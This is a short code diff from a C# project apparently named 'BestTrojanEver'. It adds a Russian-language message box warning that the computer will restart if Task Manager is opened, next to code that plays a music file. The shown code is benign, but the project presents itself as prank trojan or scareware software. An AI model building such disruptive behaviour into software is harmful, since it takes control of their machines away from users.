@@ -31,6 +31,8 @@ namespace BestTrojanEver
         {
             System.Media.SoundPlayer mainSound = new System.Media.SoundPlayer(@"music.wav");
             mainSound.Play();
+
+            MessageBox.Show("При открытии диспетчера задач компик перезапустится <3");
         }
     }
 }
